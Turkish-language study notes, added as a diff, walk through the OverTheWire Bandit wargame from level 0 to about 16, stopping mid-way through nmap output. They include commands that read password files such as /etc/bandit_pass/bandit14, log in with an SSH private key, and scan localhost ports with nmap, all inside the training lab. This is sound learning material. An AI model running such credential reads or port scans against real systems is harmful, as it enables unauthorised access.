@@ -1,0 +1,2917 @@
+hacker methodology : 
+
+1 - Reconnaisance (Keşif / Bilgi Toplama)
+
+2- Scanning (Pasif / Aktif Taramalar)
+
+3- Identyfying Vulnerabilities (Zaafiyet Tespiti)
+
+4- Gaining Access (Hedef Sistemde Erişim Elde Etmek)
+
+5- Privilege Escalation (Yetki Yükseltme)
+
+6- Reporting (Raporlama)
+
+
+https://overthewire.org/wargames/bandit/bandit0.html bağlantısından bandit isimli bir ctf i çözelim.
+
+Bandit Level 0
+Level Goal
+
+The goal of this level is for you to log into the game using SSH.
+ The host to which you need to connect is bandit.labs.overthewire.org, on port 2220.
+  The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.
+
+  şeklinde ssh kullanarak bandit.labs.overthewire.org adresine bağlanmamızı istemiş kullanıcı adı ve şifre olarak da bandit0 bilgisi verilmiş
+
+şimdi kali terminalimizde ssh bandit0@bandit.labs.overthewire.org -p 2220 çalıştırıyoruz (-p parametresi ile bağlanmak istediğimiz cihazın hangi portuna 
+bağlanmak istediğimizi belirtmemizi sağlayan bir parametredir)
+
+are you sure want to continue connecting / bağlantıya devam etmek istediğinize emin misiniz diyor 
+
+yes yazıp enterlıyoruz ardından bizden password istiyor bandit0 yazıp enterlıyoruz 
+
+şifremizi yazarken şifremiz ekranda gözükmüyor ama arkaplanda şifremiz yazılıyor 
+
+ardından bandit0 kullanıcısı olarak giriş yapmayı başardık daha sonra ls çalıştırıyoruz ve readme isimli bir dosyanın olduğunu görüyoruz 
+
+daha sonra cat readme çalıştırıyoruz ve bize bir flag metni verdi bunu kopyalıyoruz ardından exit diyerek ilgili sunucu ile bağlantımızı sonlandırıyoruz 
+
+ardından terminalde ssh bandit1@bandit.labs.overthewire.org -p 2220 çalıştırıyoruz (burada bandit1 yazmamızın sebebi az önce aldığımız flag / parola 
+bandit1 kullanıcısının şifresiydi ve biz bu ifreyi kullanarak bandit1 kullanıcısı olarak sisteme giriş yapalım)
+
+ardından bizden şifre isteyecek kopyaladığığmız şifreyi sağ tık > paste clipboard veya ctrl+shift+v ile yapıştırıyoruz 
+
+ardından bandit2 kullanıcısına nasıl geçebiliriz bunu öğrenelim 
+
+https://overthewire.org/wargames/bandit/bandit2.html bağlantısına gidersek şöyle bir yazı ile karşılaşırız;
+
+Level Goal
+
+The password for the next level is stored in a file called - located in the home directory
+
+bu bandit2 kullanıcısının şifresinin home dizinindeki - isimli bir dosyada olduğunu söylüyor ls yaptığımızda gerçekten de - iismli bir dosya 
+olduğunu görüyoruz 
+
+daha sonra cat - çalıştırdığımızda hiç bir çıktı almıyoruz çünkü - (tire / kısa çizgi) karakteri linux terminalinde parametreleri kullanmadan önce 
+kullandığımız bir karakterdir bu yüzden terminal devamında cat aracının bir parametresini çalıştıracağımızı zannettiği ve biz de bir parametre girmediğimiz 
+için - isimli dosyanın içeriğini terminale bastırmadı peki biz bu durumda ne yapabiliriz ? 
+
+cat ./- çalıştırarak - isimli dosyamızın içerisindeki flag i terminale bastırabiliriz bu flag i kopyalıyoruz 
+
+exit > ssh bandit2@bandit.labs.overthewire.org -p 2220 çalıştırıyoruz bizden bir şifre istediği zaman da ctrl+shift+v yaparak flag i yapıştırıp 
+enterlıyoruz ve gördüğümüz gibi bandit2 kullanıcısıyla giriş yapmayı başardık 
+
+ardından seviye 2 den seviye 3 e geçmek için dosya isminde boşluklar olan bir dosyayı çalıştırmamızı istiyor 
+
+ls -la çalıştırıyoruz ve bu dosyamızın isminin spaces in this filename olduğunu görüyoruz  
+
+(ancak cat space in this filename olarak çalıştırmak istediğimizde arada boşluklar olduğu için ilgili dosyanın içeriğini okuyamayz / bu şekilde yazdığımızda 
+terminalde nasıl bir çıktı alıyoruz dene buraya yaz)
+
+bunun için cat space yazıp tab tuşuna basarsak terminale biizm için bu dosyanın ismin otomatik olarak tamamlayıp 
+
+cat spaca\ in\ this\ filename şeklinde dosyamızın ismini otomatik olarak tamamlayacaktır her bir boşluktan önce \ (ters slash) koymasının sebebi 
+\ karakteri bir kaçış (escape character) dir yani kendisinden sonra gelen karakteri hiç yokmuş gibi davranmasını sağlar bir nevi komut çalıştırılırken 
+kendisini ve kendisinden sonra gelen karakteri silip komutu öyle çalıştırır yani bu mantıkla cat kullanırken boşluklu bir şekilde dosya ismi girip çalıştıramayacağımız için 
+
+                             
+                              (KOD ÇALIŞTIRILIRKEN)
+cat spaca\ in\ this\ filename ---------------------> cat spaceinthisfilename şekline dönüştürülüp iligli dosyamızın içeriği terminale bastırılır 
+
+ve terminalimizde bandit3 ün parolası olan flag i almayı başardık 
+
+ssh bandit2@bandit.labs.overthewire.org -p 2220 çalıştırıp az önceki flag i yapıştırıp enterlıyoruz 
+
+bandit3 ile giriş yaptıktan sonra ls -la çalıştırıyoruz ve inhere isminde hidden (gizli) bir diizn olduğunu görüyoruz 
+
+(ls -la çalıştırdığımızda mavi renkli olarak bastırılanlar dizin mi yoksa gizli dizin mi bu rengin anlamını araştır hangisi olduğunu buraya yaz)
+
+normalde ls çalıştırarak bu gizli dizinleri göremeyiz ancak ls -la çalıştırarak bu gizli diizn ve dosyaları görebiliriz / listeleyebiliriz 
+
+ardından tekrar ls -la çalıştırıyoruz ve bu dizin içeriisnde .hidden diyye bir dosya olduğunu görüyoruz
+
+cat .hidden çalıştırıyoruz ve bandit4 ün flagini almayı başardık 
+
+ssh bandit4@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım 
+
+ls -la > cd inhere > ls -la çalıştırıyoruz ve burada 
+
+-file00
+-file01
+-file02
+-file03
+-file04
+-file05
+-file06
+-file07
+-file08
+-file09
+
+şeklinde dosyalarımızın olduğunu görüyoruz 
+
+cat -file00 şeklinde çalıştırırsak geçersiz seçenek -f parametresi diye bir parametre yok anlamında bir çıktı alıyoruz 
+
+bu yüzden ./-file00 çalıştırıyoruz ve ilgili dosyanın içeriğini ekrana bastırdığımızda garip karakterlerden oluşan bir çıktı aldık 
+
+Tip: if your terminal is messed up, try the “reset” command. (burada bahsedilen reset komutunu dene ne işe yarıyor gör pratiğini yap yani)
+
+muhtemelen bu dosya bir görselin veya bir müzik dosyasının vs vb metinsel ifadeye çevrilmiş hali 
+
+bu yüzden tek tek bütün dosyaları denememiz gerekiyor flag i bulmak için 
+
+./-file07 çalıştırdığımızda ilgili flag i bulmayı başardık (ilgili makina güncellenebilir ve flag başka bir dosyaya konmuş olaiblir o yüzden 7 de 
+çıkmazsa kendin dene tek tek)
+
+bu flag i alıyoruz ve exit > ssh bandit5@bandit.labs.overthewire.org -p 2220 çalıştırdıktan sonra şifre olarak giriyoruz 
+
+
+seviye 5 den 6 ya geçerken 
+
+Bandit Level 5 → Level 6
+Level Goal
+
+The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:
+
+    human-readable
+    1033 bytes in size
+    not executable
+
+
+flag i bulunduran dosyamızın inhere isimli dizinin içerisindeki 
+
+clear-text olarak okunabilir yani = human-readable (garip karakterlerden oluşmayan normal latin harflerinden oluşan karakterleri kastediyor)
+1033 byte dosya boyuntunda olduğunu söylüyor iligli dosyamızın ve çalıştırılabilir olmayan bir dosya olduğunu söylüyor 
+
+şimdi bu dosyayı arramaya başlayalım bandit5 ile giirş yaptıktan sonra 
+
+cd inhere > ls -la çalıştırdığımızda bir çok dizin olduğunu görüyoruz ancak bu dosyalardan hangisinin 1033 byte olduğunu yani dosya boyutunu bu 
+çıtıda göremiyoruz bu yüzden farklı bir komut deneyelim 
+
+çünkü buradaki 20 dizinin içerisine girip ilgili dosyayı bulmaya çalışmak çok uuzn bir süreç yani bunun kolay bir yolu olmalı 
+
+biz flag i içeren dosyamızı bulmak için find ı kullanalım find --help çalıştırarak find da kullanabileceğimiz parametreleri görebiliriz 
+
+bize zaten çalıştırılabilir olmadığı ve dosya boyutu verilmişti 
+
+/inhere dizinindeyken find . -type f -size 1033c çalıştırdığımızda ilgili dosyamızın hangisi olduğu / isminin çıktı olarka alıyoruz 
+
+peki not executable olduğunu parametre içeriisnde belirterek dosyamıız nasıl arayabiliriz bunu öğrenelim 
+
+find . -type f -size 1033c ! -executable çalıştırarak hem boyutu 1033 byte hem de çalıştırılabilir olmayan dosyalarımızı ekrana bastırdık zaten bu şekilde 
+bir dosya vardı (parametre de kullandığımız 1033c deki c ne anlama geliyor neyin kısaltması araştır buraya yaz ve find ın parametrelerinde 
+sadece executable olanları bul diye bir parametre vardı peki biz nasıl olmayan ları bulduk bunun sebebi parametreden önce kullandığımız ! karakteridir bu 
+karakter ile bir dizinde bir dosya ararken bu parametre file filtrelediğimiz dosyaların dışındaki bütün dosyaları çıkı olarak alırız 
+bütün dosyaları mı yani örneğin sadece find . -type ! -executable çalıştırsaydık sadece çalıştırılabilir olmayan dosyaları mı çıktı olarak alacaktık 
+ve dosya ile bilrikte diiznlerde m gelecekti bunu araştır yani ! karakterinin kapsamını öğren buraya yaz)
+
+ardından terminale executable olmayan dosyanın ismi yazdırılır 
+
+/inhere dizinindeyken ./maybehere07/.file2 çalıştırıyoruz ve flagimizi alıyoruz 
+
+ardından exit diyerek bağlantımızı sonlandırıyoruz 
+
+
+ssh bandit6@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım 
+
+bu uygulamamızda flag somewhere on the server isimli bir dosyada 
+
+ve bu dosyamızın kullanıcı sahipliği izni user bandit7, grup sahipliği bandit6 ve 33 byte boyutunda bir dosyaymış 
+
+bandit6 kullanıcısı ile giriş yaptığımızda ve ls çalıştırdığımızda hiç bir çıktı almıyoruz 
+
+ardından ls -la çalıştıralım yine neredeyse hiç bir çıktı / osnuç almadık 
+
+find . ile başlayan arama komutları bizim terminalde içerisinde bulunduğumuz dizinde arama yap anlamına gelir örneğin biz terminalde 
+/home dizinindeysek aramaları sadece home dizininde yapar ama bizim şuan içinde bulunduğumuz dizinde ne bir dosya ne de bir dizin var (gereksiz dosya ve dizinler hariç)
+
+biz yine de içinde bulunduğumuz dizinde bu aramayı yapalım denemek ve pratik olması açısından 
+
+find . -type f -user bandit7 -group bandit6 -size 33c çalıştırdığımızda hiç bir çıktı alamadık demekki bulunduğumuz diiznde değilmiş 
+
+(komutta -type f file yani sadece dosyaları bul mu demek?, -user bandit7 = ilgili dosyanın kullanıcı sahipliği user7 kullanıcısına ait olan dosyaları getir 
+-group bandit6 da sadece bandit6 grubunda olan / grup izni, ait olduğu group bandit6 olan dosya / dosyaları getir demek)
+
+find / -type f -user bandit7 -group bandit6 -size 33c çalıştırdığımızda ilgili sistemdeki / sunucudaki komuttaki filtrelemeye uyan BÜTÜN dosyaları 
+arayabiliriz çünkü / dizini en kök (root) dizindir bütün diiznler bu dizinin bir alt dizinidir ama / != /root ile eşit değildir aynı şeyi ifade 
+etmezler eşdeğer değillerdir yani 
+
+/ farklı, /root farklı bir dizindir /root, / dizininin bir alt dizinidir 
+
+ve komutumuzu çalıştırdığımızda gelen çıktı satırlarının 1 tanesi hariç hepsinin sonunda Permission denied (izin reddedildi) yazısı biiz karşılıyor 
+bu yazının anlamı şudur; yani ilgili diizndeki ilgili dosyayı okumaya,yazmaya veya dğeiştirmeye bunlardan 3 tanesinden birinini yapmaya yetkimiz yok 
+(bu eylemlerden sadece 3 tanesinden biri mi yoksa 2 si yoksa tamamı mı yani bir dosya hakkında yetkimizin olmadığında mı bu yazı karşımıza çıkıyor? araştır buraya yaz)
+
+gelen çıktılardan permission denied yazmayanın sadece /var/lib/dpkg/info/bandit7.password olduğunu görüyoruz 
+
+cat /var/lib/dpkg/info/bandit7.password çalıştırıyoruz ve terminale yazdırılan flagimizi kopyalıyoruz 
+
+ssh bandit7@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım 
+
+
+bu seviyemizde flagimiz data.txt isimli bir dosyadaymış ve flagimiz bu dosyanın içerisindeki millionth kelimesinden sonra geliyormuş 
+
+bazen sunucu ile olan bağlantımızda sorun yaşayabiliriz ve terminalimiz tamamen kilitlenebilir bu durumlarda her seviyeden sonra ilgili seviyenin 
+
+flagini bir dosyaya kaydedersek terminal kilitlendiğinde yeniden giriş yaparken kolayca bu şifre ile giriş yapabiliriz 
+
+bandit7 ile giriş yaptıktan sonra ls -la çalıştırdığımızda data.txt nin bulunduğumuz dizinde olduğunu görüyoruz 
+
+ardından cat data.txt çalıştırıyoruz ve 4bm büyüklüğünde stringler içeren devasa bir string yığınının karşımıza geldiğini görüyoruz 
+
+terminalin Actions tabından Find a tıklayıp ya da kısayol ile ctrl+chift+f yaparak find ı açıyoruz millionth yazıyoruz ama herhangi bir sonuç 
+bulamıyoruz burada millionth derken 'millionth' kelimesini değil muhtemelen 1.000.000. yani bir milyonuncu / milyonuncu kelimede olduğunu söylemek istedi 
+bize (böyle değilmiş gerçekten millionth kelimesinden sonraymış flag)
+
+(strings data.txt komutundaki strings ne işe yarıyor araştır buraya yaz)
+
+strings data.txt | grep "millionth" çalıştırarak 
+
+millionth        FLAG şeklinde flagimizi elde etmeyi başardık 
+
+komutumuzda kullandığımız strings data.txt yazarak data.txt nin içerisindeki verileri string bir yani metinsel bir ifadeye döbnüştürerek bu 
+dosyanın içerisinde | grep şeklinde bir arama yapmaya elverişli / hazır hale getirdik (strings yazmasaydık da yine millionth  FLAG çıktısını almayacak 
+mıydık strings in ne faydası oldu tam olarak görevi nedir ne iş yapar ve hangi durumlarda kullanılır bunu araştır buraya yaz)
+
+ardından flagimizi kopyalıyoruz 
+
+ssh bandit8@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım 
+
+bu seviyemizde yine data.txt isimli bir dosya var ama bu dosyanın içerisinde yalnızca bir defa tekrar eden / yani yalnızca bir satırda geçen bir veri var 
+
+bizim de bu veriyi bulmamızı istiyor 
+
+diğerleri birden fazla kez tekrarlanıyor (diğer satırlar)
+
+biz bu durumda uniq operatörünü kullanabilriz uniq --help çalıştırırsak uniq i hangi parametreler ile kullanabileceğimizi ve bu parametrelerin 
+ne işe yaradığını görebiliriz 
+
+eğer uniq -c veya uniq --count parametrelerini kullanırsak ilgili dosyanın içerisindeki verilerin her bir satırının dosya içerisinde kaç defa tekrar ettiğini 
+ilgili satırın başında bir sayısal değer olarak bize verir 
+
+bu parametreyi kullanabiliriz 
+
+strings data.text | uniq -c çalıştırdığımızda gelen çıktıdaki satırların hepsinin başında 1 değerini görüyoruz yani bu şekilde doğru bir sonuç alamadık 
+
+doğru bir sonuç alamadık çünkü uniq operatörü (veya uniq -c parametresi hangisi tam emin dğeilim araştır buraya yaz hangisi olduğunu)
+ilgili data sadece alfabetik veya numeric olarak sıralandığında bu --count veya -c parametresi düzgün bir sonuç veriyor 
+
+bu yüzden biz de data.txt dosyasını önce alfabetik olarak sıralayıp -bu işleme sort, sortlamak / sorting  deniliyor 
+daha sonra da bunu | ile uniq -c yaparak, yalnızca bir defa tekrar eden satırı bulabiliriz 
+
+sort data.txt | uniq -c çalıştırıyoruz ve yalnızca bir defa tekrar eden satırı yani flagimizi kopyalıyoruz 
+
+ssh bandit9@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım 
+
+bu seviyemizde flagimiz önünde bir kaç tane = (eşittir) karakteri olacak şekilde yine data.txt dosyasının içerisindeymiş 
+
+ls -la çalıştırıyoruz data.txt ile aynı dizinde olduğumuzu görüyoruz ve dosyamız 19Kb mış 
+
+cat data.txt ile dosyamızı açıyoruz ve garip karakterlerden oluşan bir yığın yazıyla karşılaşıyoruz 
+
+başında = karakterinin olduğunu bildiğimiz için strings data.txt | grep "=" çalıştırıyoruz 
+
+ve gelen çıktının sondan ikinci satırında düzgün bir string görüyoruz muhtemelen flagimiz bu kopyalayıp 
+
+ssh bandit10@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım 
+
+ve başarıyla giriş yaptığımızı görüyoruz;
+
+bu seviyemizde flagimizin yine data.txt dosyasını içerisinde base64 ile şifrelenmiş bir şekilde yer aldığını söylüyor info 
+
+ls -la çalıştırdığımızda data.txt yi görüyoruz boyutu çok küçük 69 byte 
+
+cat data.txt çalıştırıyoruz ve karşımıza çıkan base64 hashini görüyoruz 
+
+base64 -d data.txt komutunu çalıştırarak kalide hazır gelen bir tool yardımıyla hash i çözerek clear flag stringimizi terminale bastırabiliriz 
+
+flagimizi kopyalıyoruz ve 
+
+ssh bandit11@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım 
+
+
+ls -la çalıştırdığımızda data.txt nin olduğunu görüyoruz 
+
+ardından cat data.txt çalıştırdığımızda boşluklu yapıda bir hash görüyoruz bu muhtemelen sezar şifrelemesi ile şifrelenmiş 
+
+ROT13 denilen bir şifreleme yöntemiyle (bu şifreleme yönteminin mantığını iyice anla buraya yaz o aradaki boşluklarla ayrılan kısımlar clear text 
+de hangi kelimelere denk geliyor buraya yaz)
+
+
+https://www.boxentriq.com/code-breaking/rot13
+
+bağlantısından bir rot13 decoder sitesine gidiyoruz 
+
+Message input box ına hashimizi yapıştırdığımızda Translation kısmında hashin clear text halini yani flagimizi görebiliriz, bunu kopyalıyoruz 
+
+
+ssh bandit12@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım
+
+Hexdump Hesaplamada, bir onaltılık döküm, 
+RAM'den veya bir bilgisayar dosyasından veya depolama aygıtından bilgisayar verilerinin onaltılı bir görünümüdür.
+ Onaltılık bir veri dökümüne bakmak genellikle ya hata ayıklama ya da tersine mühendislik bağlamında yapılır. 
+
+ bu seviyede flagimizin data.txt dosyasının içerisinde 16 bitlik veri kümelerine dönüştüürlmüş bir şekilde hexdump ypıldığını görüyoruz 
+
+ yani kısaca orjinal bir text veya başka bir veri içeren dosyanın hexedecimal (16 lık sayı sisteminde gösterimi diyebiliriz)
+
+ hexdumpa bir örnek vermek gerekirse; 
+
+ 00105e0 e6b0 343b 9c74 0804 e7bc 0804 e7d5 0804
+ 00105f0 e7e4 0804 e6b0 0804 e7f0 0804 e7ff 0804
+ 0010600 e80b 0804 e81a 0804 e6b0 0804 e6b0 0804
+
+ hexdump, orijinal bir verinin önce binary kodların dönüştürülüp daha sonra bu ikili kodların mı hexedecimal olarak gösterimi yoksa 
+ direkt olarak clear verinin mi hex gösterimi araştır buraya yaz 
+
+ ilgili seviyede sitesinde verilen bilgiye göre dosya hem ziplenmiş (sıkıştırılmış) hem de hexe çevrilmiş 
+
+ dosyamızı clear bir şekilde okunacak hale getirmek için /tmp dizininde bir dosya oluşturarak işlemlerimizi bu dizinde yapalım 
+ 
+ çünkü şuan internete açık bir sunucuya bağlandığımız için muhtemelen çok fazla yetkimiz yoktur yani başka dizinlerde dizin / dosya oluşturma 
+ yetkimiz vs yoktur 
+
+ sadece bu ctf de değil pek çok ctf de eğer ilgili flag i almamız için bir dizin / dosya içerisinde işlem yapmamız gerekirse bunu /tmp 
+ de yapmalıyız 
+
+ bu yüzden mkdir /tmp/myname123 şeklinde bir dizin / klasör oluşturuyoruz 
+
+ cp data.txt /tmp/myname123 komutunu çalıştırarak data.txt dosyasını yeni oluşturduğum myname123 isimli klasörün içerisine kopyalıyoruz 
+
+ ardıdnan cd /tmp/myname123 
+
+ bir verinin hexdump ını almak için veya hexdump ı alınmış bir veriyi tekrar eski haline çevirmek için kullanabileceğimiz xxd isimli bir araç var
+
+ xxd --help çalıştırırsak iligli tool un help sayfasına gidebiliriz 
+
+ xxd -r data.txt > binary çalıştırdığımızda -r parametresi ile data.txt dosyasının içeriisndeki hexedecimal verileri binary kodlarına yani 16 lık sayı 
+ sisteminden 2 lik sayı sistemine çevirir > karakteri yönlendirme operatörüdür başka bir isimle çevirilen binary kodlarını binary ismindeki bir 
+ dosyanın içeriisnde yazdırdık ancak bu dosya sıkıştırıldığı için henüz kullanıma hazır olmaaycak şimdi sıkıştırılmış bu binary dosyasını açmamız 
+ gerekiyor 
+
+ file binary çalıştırdığımızda ilgli dosyamızın nasıl bir dosya olduğunu türünün ne olduğunu uzantsının ne olduğu ile ilgili bilgiler alıyoruz 
+
+ gelen çıktıda bu dosyanın bir gzip compressed data olduğunu görüyoruz; gzip bir zipleme aracıdır, winrar gibi düşünebiliriz 
+
+ bunun gibi pek çok zipleme aracı bulunur linux da örneğin winzip, tar gzip, bzip2 vs 
+
+ gzip -d binary çalıştırdığımızda bize bir hata veriyor unknown suffix -- ignored hatası aldık muhtemelen binary isimli dosyamızın bir uzantısı 
+ olmadığı için dosyamızın bir gzip dosyası olduğunu tespit edemedi / algılayamadı / kabul etmedi 
+
+ mv binary binary.gz çalıştırarak (mv yi eğer, bir dosyayı bulunduğu dizinin içerisinde taşırsak o dosyanın uzantısını da değiştireibliyoruz biz gzip -d 
+ komutunu başarıyla çalıştırmak için böyle bir çözüm üretiyoruz / peki başka dizinlere taşırken de uzantıısnı değiştireibliyor muyuz ? bunu 
+ araştır buraya yaz...)
+
+ ls çalıştırdığımızda zipli bir dosya olduğunu ifade etmek için binary.gz dosya ismimiz kırmızı bir şekilde yazılı terminalde halbuki bunu yapmadan önce binary 
+ şeklinde ve beyaz bir renkte yazılıydı 
+
+ gzip -d binary.gz çalıştırarak unzip yapıyoruz ve tekrar ls çalıştırdığımızda binary iismli bir dosya ile arşılaşıyoruz ve beyaz renkte 
+
+ diğer binary.gz dosyası kayboldu çünkü zipten çıkardıktan sonra iligli dosya silinir 
+
+ ardından file binary çalıştırdığımızda bu dosyanın da sıkıştırılmış bir dosy olduğunu görüyoruz 
+
+ bu sefer bzip2 compressed data bilgisini aldık yani bzip2 aracı kullanılarak sıkıştırılmış 
+
+ mv binary binary.bz2 çalıştırarak dosyamızın uzantısını değiştiriyoruz 
+
+ ardından bzip2 -d binary.bz2 çalıştırıp unzip ediyoruz ardından ls dediğimizde binary dosyamızı görüyoruz 
+
+ file binary çalıştırdığımızda gzip compressed data çıktısını alıyoruz yani 3 defa sıkıştırılmış 
+
+ mv binary binary.gz > gzip -d binary.gz > file binary çalıştırdığmızda 
+
+ POSIX tar archive (GNU) çıktısını alıyoruz bu sefer de tar ile sıkıştırılmış 
+
+ mv binary binary.tar > tar xf binary.tar çalıştırıyoruz ve ardından ls çalıştırıyoruz 
+
+ ardından hem binary.tar (kırmızı renkle gösteriliyor) hem de bu dosyanın içerisinden çıkarmış olduğumuz beyaz renkli bir data5.bin isimli bir 
+ dosya olduğunu görüyoruz file data5.bin çalıştırdığıızda bu dosyanın da yine bir tar archive olduğunu görüyoruz 
+
+ mv data5.bin binary.tar > tar xf binary.tar > ls > file data6.bin çalıştırdığımızda bzip2 ile sıkıştırıldığını görüyoruz 
+
+ mv data6.bin binary.bz2 > bzip2 -d binary.bz2 > ls > file binary çalıştırdığımızda tekrar tar ile sıkıştırıldığını görüyoruz 
+
+ ardında bir önceki .tar dosyası ile karıştırmamak için diğerini siliyoruz rm binary.tar çalıştırarak 
+
+ daha temiz bir görüntü olması için rm data.txt çalıştırarak data.txt yi de siliyoruz 
+
+mv binary binary.tar > tar xf binary.tar > ls > file data8.bin  çalıştırdığımızda tekrar gzip ile sıkıştırıldığını görüyoruz 
+
+mv data8.bin binary.gz > gzip -d binary.gz > ls > file binary çalıştırdığımızda ASCII text çıktısı aldık yani sonunda ASCII karakterlerinden 
+oluşan text dosyasını elde etmeyi başardık daha sonra cat binary çalıştırıyoruz ve flagimizi kopyalayıp; 
+
+ssh bandit13@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım
+
+bu seviyemizde flagimiz bandit14 ün şifresi /etc/bandit_pass/bandit14 dizinindeki dosyadaymış ama bu dosyayı yalnızca bandit14 okuyabiliyormuş yani biz
+de bandit13 olduğumuza göre bu dosyayı okumaya iznimiz yok ama /home dizinindeki (~ (tilde karakteriyle gösterilen bir dizindir home directory diye de geçer))
+
+bandit in web sitesindeki bilgilendirme yazısı bu seviye için bandit14 ün şifresini almayacaksınız diyor, SSH private key dosyası ile 
+ssh komutunda bu dosyayı belirterek ilgili bağlantıya ssh şifresi girmeden giriş yapabilmek demek 
+
+ls -la çalıştırdığımızda zaten sshkey.private dosyasının olduğunu görüyoruz 
+
+normalde ssh ile bağlanırken ssh kullanıcı-adı@ip-adresi veya domain-ismi ardından da komutumuzda belirttiğimiz kullanıcının
+ ilgili sunucudaki / sistemdeki şifresi ile giriş yapıyoruz ancak ssh key de direk olarak kullanıcı adı | ip adresi veya domain name ve ssh private key 
+ i belirterek giriş yapabiliriz 
+
+ ssh --help çalıştırarak ssh in help sayfasına gidebiliriz 
+
+ ssh -i sshkey.private bandit1414@localhost çalıştırıyoruz (burada önceki komutlarda olduğu gibi uzun uzun sunucunun domain name ini yazmamamızın 
+ sebebi zaten bandit13 ile sunucuya giriş yaptığımız ve geçmek istediğimiz bandit14 kullanıcısı da aynı sunucuda yer aldığı için uzun uzun yazmamıza 
+ gerek olmadığını söylüyor peki uzun uzun yazsaydık nasıl bir çıktı alırdık yine bağlanır mıydı yoksa hata verir miydi araştır buraya yaz)
+
+(bu seviyede bize bu ssh private key ve @localhost olayını öğretmek istemiş)
+
+ardından yes yazarak bağlanmak istediğimizi onaylıyoruz entera basıyoruz ve başarıyla bandit14 e gitmiş olduk 
+
+ve bize bu uygulamanın en başında bandit 14 ün şifresinin /etc/bandit_pass/bandit14 dizininideki dosyada olduğunu söylemişti şimdi bu dizine gidiyoruz 
+
+cd /etc/bandit_pass çalıştırarak ardından ./bandit14 çalıştırabiliriz ya da bunu tek bir komutta yapmak istersek bunun için de 
+
+cat /etc/bandit_pass/bandit14 çalıştırabiliriz ekrana yazdırılan flag i passwords dosyamıza kaydediyoruz 
+
+şimdi bandit14 den bandit15 e geçmek için güncel sahip olduğumuz oturumun parolasını / flagini bunu localhost un 30.000 portuna yollayın diyor 
+
+(her seviyede sitede commands you may need to solve this level şeklinde yazan başlığın altında bu seviyeyi çözmek için hangi komut veya toolları kullanabileceğimizden 
+bahsediyor ilgili seviyenin çözümünü burada bahsedilen bütün toollar ile gerçekleştirmeyi araştır ve öğren)
+
+(yine aynı şekilde bu başlığın altında Helpful Reading Material başlığının altında ilgili seviyedeki problemi çözmek için faydalanileceğimiz materyal ve dökumanların bulunduğu kısmı incele)
+(bandit15 den 16 ya geçerken sitesindeki bilgilendirici yazıları oku ne demek istiyor anla buraya yaz helpful note: kısmından itibaren!)
+biz bu uygulamada nc yani netcat toolunu kullanalım 
+
+nc localhost 30000 yazıp ctrl+v veya ctrl+j ile yeni bir satıra geçiyoruz ardından bu yeni satıra sağ tık paste vlipboard diyerek flagimizi 
+yapıştırıyoruz yani en son olarak şöyle bir görünüm oluyor 
+(burada local host yazmamızın sebebi zaten tarayacağımız portlar içinde bulunduğumuz sunucunun portları olduğu için local host yazdık)
+
+nc localhost 30000
+flag-stringi 
+
+yazıp çalıştırıyoruz ardından Correct! çıktısını ve bu çıktının bir alt satırında bandit15 e geçmek için kullanabileceğimiz flagimizi görüyoruz 
+
+
+ssh bandit15@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım
+
+
+şimdi örneğin bandit14 kullanıcısındayken exit yapıp çıkış yaparsak sunucudan tamamen çıkmayız bandit13 kullanıcısına geçiş yaparız 
+
+bunun sebebi yaptığımız uygulamalar gereği sürekli kullanıcılar arasında geçiş yaptığımızdan dolayı mı yani bir terminali açtığımız süre boyunca 
+
+birden fazla kullanıcı değiştirdiysek exit yaptığımızda o kullanıcıdan bir önceki oturum açtığımız kullanıcıya mı dönüyor yani 
+
+bu terminali kapatsak ve yeni bir terminalde örneğin bandit14 e bağlansak daha sonra exit desek sunucudan bağlantımızı tamamen keser miyiz yoksa 
+yine bandit13 kullanıcısına geçiş yapar mıyız bunu araştır buraya yaz 
+
+bu dersimizde nmap ile ilgili bazı işlemler gerçekleştirelim 
+
+bu uygulamamızda bandit 15 in şifresini SSL encryption kullanarak 30001 portuna yollamamızı istiyor (bunu https ile bağlanmak gibi düşünebiliriz)
+
+bu uygulamamız için ncat toolunu kullanabiliriz
+
+ncat --ssl localhost 30001 
+flag şeklinde çalıştırıyoruz 
+
+(eğer bu şekilde flag i yeni bir satıra kaydedip tek bir komut olarak çalıştırdığımızda Correct! çıktısı vermez ise yani başarıyla ilgili porta 
+yollamaz ise önce ncat --ssl localhost 30001 çalıştırıp daha sonra bir alt satıra geçerse buraya da flag i yapıştırıp tekrar entera basarak göndermeyi 
+dene bunu bir önceki örnek için de uygula çalışmaz ise)
+
+ardından bize bandit16 nın parolasını verdi bunu kopyalayıp dosyamıza kaydediyoruz 
+
+ssh bandit16@bandit.labs.overthewire.org -p 2220 çalıştırıp az önceki flag i yapıştırıp enterlıyoruz
+
+bu uygulamamızda bandit16 nın parolasını 31.000 ile 32.000 arasındaki bir porta göndermemizi istiyor ancak bu aralıkta 1 tane port var biz hangi porta 
+göndereceğimizi bilemeyeceğimiz için nmap kullanarak bu aralıktaki portları tarayalım ve hangi port dinlemedeyse bu porta yine ssl encryption 
+ile flagimizi gönderelim ve bandit17 nin flagini alalım 
+
+nmap localhost -p- çalıştırarak bütün portları tarayabiliriz ancak biz bunu istemiyoruz hem çok uzun sürebilir hem de seviyenin bize öğretmek istediği 
+nmap ile belirli aralıktaki portları tara parametresini öğrenememiş oluruz 
+
+bu yüzden nmap localhost -p 31000-32000  çalıştırıyoruz ve açık olan / dinleyen 5 adet port olduğunu görüyoruz 
+
+gelen çıktıda 
+
+PORT    STATE    SERVICE 
+
+şeklinde sürunlar ve ve bu sütunların değerleri olarak port sütununun altında ilgili port numarası 
+state(durum) sütununun altında ilgili portun durumu açık(open) / kapalı(close) vb durumlar 
+
